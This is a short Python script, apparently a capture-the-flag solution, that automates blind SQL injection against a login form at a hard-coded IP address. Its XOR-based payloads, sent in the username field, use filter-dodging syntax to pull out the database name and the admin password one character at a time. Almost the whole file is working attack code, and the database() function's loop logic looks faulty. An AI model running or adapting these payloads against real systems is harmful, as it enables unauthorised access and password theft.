import requests
str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/="
url="http://123.206.31.85:49167/index.php"
r=requests.session()
def database():
    result=""
    for i in range(30):
        flag = 0
        for j in str_all:
            payload="admin'^(ascii(mid(database()from({})))<>{})^0#".format(str(i),ord(j))
            data = {
                "username": payload,
                "password": "123"
            }
            s=r.post(url,data)
            print(payload)
            if "error" in s.text:
                result+=j
                print(result)
            if flag == 0:
                break
def password():
    result=""
    for i in range(40):
        flag=0
        for j in str_all:
            payload = "admin'^(ascii(mid((select(password)from(admin))from({})))<>{})^0#".format(str(i+1),ord(j))
            data = {
                "username": payload,
                "password": "123"
            }
            s=r.post(url,data)
            print(payload)
            if "error" in s.text:
                result+=j
                flag=1
                print('**************************',result)
        if flag==0:
            break
#database()
password()